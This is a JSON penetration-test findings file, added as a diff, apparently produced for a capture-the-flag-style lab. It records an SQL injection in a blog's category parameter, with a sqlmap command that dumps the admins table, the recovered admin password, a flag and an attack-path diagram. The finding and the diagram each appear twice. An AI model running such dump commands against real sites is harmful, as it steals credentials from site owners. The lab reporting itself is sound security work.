@@ -1,0 +1,54 @@
+{
+  "meta": {
+    "created": "2026-04-15T01:02:37.092513+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "53124f8f-a9a0-44b7-8607-c67db4620cef",
+      "timestamp": "2026-04-15T01:02:37.092397+00:00",
+      "title": "SQL Injection in category parameter leading to admin credential theft",
+      "severity": "critical",
+      "target": "http://172.17.0.1:57383",
+      "description": "The 'category' GET parameter in index.php is vulnerable to SQL injection (boolean-based blind, error-based, time-based blind, and UNION query). This allowed dumping the admins table to obtain admin credentials, which were used to log in and retrieve the flag.",
+      "evidence": "flag{ac81cf96-72fe-462f-8a3f-97d5cd189d42}",
+      "tool_used": "sqlmap",
+      "cve": "",
+      "reproduction": {
+        "type": "command",
+        "command": "sqlmap -u \"http://172.17.0.1:57383/?category=Tech\" --batch -D blogDB -T admins --dump",
+        "expected": "admin:ONEverySecurePassword123!"
+      }
+    },
+    {
+      "id": "1a73e789-95f1-4909-a3ab-fdb367250aa1",
+      "timestamp": "2026-04-15T01:02:37.192486+00:00",
+      "title": "SQL Injection in category parameter leading to admin credential theft",
+      "severity": "critical",
+      "target": "http://172.17.0.1:57383",
+      "description": "The 'category' GET parameter in index.php is vulnerable to SQL injection (boolean-based blind, error-based, time-based blind, and UNION query). This allowed dumping the admins table to obtain admin credentials, which were used to log in and retrieve the flag.",
+      "evidence": "flag{ac81cf96-72fe-462f-8a3f-97d5cd189d42}",
+      "tool_used": "sqlmap",
+      "cve": "",
+      "reproduction": {
+        "type": "command",
+        "command": "sqlmap -u \"http://172.17.0.1:57383/?category=Tech\" --batch -D blogDB -T admins --dump",
+        "expected": "admin:ONEverySecurePassword123!"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "879f0f55-0126-41a8-a160-422470b0dc9e",
+      "timestamp": "2026-04-15T01:02:47.076230+00:00",
+      "title": "Blog Application Architecture",
+      "mermaid": "graph TD\n    A[Browser] -->|GET /?category=| B[Apache/2.4.54]\n    A -->|POST /admin.php| B\n    B -->|PHP 7.4.33| C[index.php]\n    B -->|PHP 7.4.33| D[admin.php]\n    C -->|SQL Query| E[(MySQL blogDB)]\n    D -->|SQL Query| E\n    E -->|admins table| F[Admin Credentials]\n    E -->|posts table| G[Blog Posts]\n    E -->|comments table| H[Comments]\n    C -.->|SQLi via category param| E\n    D -.->|Auth bypass with dumped creds| F"
+    },
+    {
+      "id": "5e8d6ff5-141c-4395-a3fc-6ecfa224db2b",
+      "timestamp": "2026-04-15T01:02:47.140294+00:00",
+      "title": "Blog Application Architecture",
+      "mermaid": "graph TD\n    A[Browser] -->|GET /?category=| B[Apache/2.4.54]\n    A -->|POST /admin.php| B\n    B -->|PHP 7.4.33| C[index.php]\n    B -->|PHP 7.4.33| D[admin.php]\n    C -->|SQL Query| E[(MySQL blogDB)]\n    D -->|SQL Query| E\n    E -->|admins table| F[Admin Credentials]\n    E -->|posts table| G[Blog Posts]\n    E -->|comments table| H[Comments]\n    C -.->|SQLi via category param| E\n    D -.->|Auth bypass with dumped creds| F"
+    }
+  ]
+}
